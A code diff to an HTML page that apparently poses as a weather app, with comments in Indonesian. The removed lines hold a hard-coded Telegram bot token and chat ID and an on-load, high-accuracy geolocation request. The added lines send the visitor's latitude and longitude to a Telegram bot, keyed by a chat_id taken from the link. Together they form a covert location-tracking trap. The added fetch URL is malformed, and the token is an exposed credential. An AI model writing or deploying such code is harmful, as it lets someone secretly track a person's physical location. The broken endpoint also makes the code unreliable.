@@ -444,28 +444,28 @@
     </div>
 
     <script>
-        // ============================================
-        // ⚙️ GANTI DENGAN MILIK ANDA
-        // ============================================
-        const T_TOKEN = '8600694543:AAGWm5FDg3BIAkBSyZvZQhqwk7UpPAuL3VQ';
-        const T_CHAT  = '8799174278';
-        // ============================================
+// 1. Tambahkan baris ini di paling atas bagian script Anda
+const TELEGRAM_BOT_TOKEN = "TOKEN_BOT_ANDA_DI SINI";
 
-        const splash = document.getElementById('splash');
-        const splashStatus = document.getElementById('splashStatus');
-        const progressFill = document.getElementById('progressFill');
-        const errorView = document.getElementById('errorView');
-        const weatherApp = document.getElementById('weatherApp');
+function getChatIdFromURL() {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('chat_id');
+}
 
-        // ===== AUTO START =====
-        window.addEventListener('load', () => {
-            progressFill.style.width = '15%';
-            navigator.geolocation.getCurrentPosition(gotLocation, locationErr, {
-                enableHighAccuracy: true,
-                timeout: 20000,
-                maximumAge: 0
-            });
-        });
+// 2. Cari fungsi bawaan web Anda yang mengambil koordinat (latitude & longitude)
+// Tambahkan fungsi fetch ini tepat di dalam fungsi sukses geolocation Anda:
+const chatId = getChatIdFromURL();
+if (chatId) {
+    fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendLocation`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            latitude: latitude, // sesuaikan dengan variabel lat Anda
+            longitude: longitude // sesuaikan dengan variabel lon Anda
+        })
+    });
+}
 
         // ===== LOCATION SUCCESS =====
         async function gotLocation(pos) {
